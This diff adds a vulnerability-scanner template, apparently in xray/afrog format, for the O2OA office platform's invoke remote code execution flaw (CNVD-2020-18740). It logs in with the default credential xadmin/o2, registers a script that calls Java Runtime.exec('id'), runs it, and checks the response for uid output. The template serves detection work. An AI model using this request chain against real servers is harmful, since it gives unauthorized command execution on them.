@@ -1,0 +1,62 @@
+expression: r0() && r1() && r2()
+id: CNVD-2020-18740
+info:
+  author: zan8in
+  description: "O2OA\u662F\u4E00\u6B3E\u5F00\u6E90\u514D\u8D39\u7684\u4F01\u4E1A\u53CA\
+    \u56E2\u961F\u529E\u516C\u5E73\u53F0\uFF0C\u63D0\u4F9B\u95E8\u6237\u7BA1\u7406\
+    \u3001\u6D41\u7A0B\u7BA1\u7406\u3001\u4FE1\u606F\u7BA1\u7406\u3001\u6570\u636E\
+    \u7BA1\u7406\u56DB\u5927\u5E73\u53F0,\u96C6\u5DE5\u4F5C\u6C47\u62A5\u3001\u9879\
+    \u76EE\u534F\u4F5C\u3001\u79FB\u52A8OA\u3001\u6587\u6863\u5206\u4EAB\u3001\u6D41\
+    \u7A0B\u5BA1\u6279\u3001\u6570\u636E\u534F\u4F5C\u7B49\u4F17\u591A\u529F\u80FD\
+    \uFF0C\u6EE1\u8DB3\u4F01\u4E1A\u5404\u7C7B\u7BA1\u7406\u548C\u534F\u4F5C\u9700\
+    \u6C42\u3002 O2OA\u7CFB\u7EDFinvoke \u63A5\u53E3\u5B58\u5728\u8FDC\u7A0B\u4EE3\
+    \u7801\u6267\u884C\u6F0F\u6D1E\u3002\u653B\u51FB\u8005\u53EF\u5229\u7528\u6F0F\
+    \u6D1E\u6267\u884C\u4EFB\u610F\u4EE3\u7801\u3002\ntitle==\"O2OA\"\n"
+  name: "O2OA invoke \u540E\u53F0\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\
+    \ CNVD-2020-18740"
+  reference:
+  - http://wiki.peiqi.tech/wiki/oa/O2OA/O2OA%20invoke%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2020-18740.html
+  severity: critical
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b'"type":') && response.body.bcontains(b'"success"')
+    output:
+      cook: search1["cook"]
+      search: '"x-token=(?P<token>[\\w_]+);".bsubmatch(response.body)'
+      search1: '"Set-Cookie: (?P<cook>.*?);".bsubmatch(response.raw_header)'
+      token: search["token"]
+    request:
+      body: '{"credential":"xadmin","password":"o2"}
+
+        '
+      headers:
+        Authorization: anonymous
+        Content-Type: application/json; charset=UTF-8
+      method: POST
+      path: /x_organization_assemble_authentication/jaxrs/authentication/captcha?v=7.1&l7u46why
+  r1:
+    expression: (response.status == 200 && response.body.bcontains(b'"type"') && response.body.bcontains(b'"sucess"'))
+      || (response.body.bcontains(b'"type"') && response.status == 500 && response.body.bcontains(b'"error"'))
+    request:
+      body: '{"id":"cmd","name":"cmd","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var
+        bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar
+        result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if
+        (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result,
+        \"application/json\"); ","remoteAddrRegex":"","createTime":"2022-08-27 04:39:18","updateTime":"2022-08-27
+        04:39:18"}
+
+        '
+      headers:
+        Authorization: '{{token}}'
+        Content-Type: application/json; charset=UTF-8
+        Cookie: '{{cook}}'
+      method: POST
+      path: /x_program_center/jaxrs/invoke?v=6.3
+  r2:
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+    request:
+      headers:
+        Content-Type: application/json; charset=UTF-8
+        Cookie: '{{cook}}'
+      method: POST
+      path: /x_program_center/jaxrs/invoke/cmd/execute
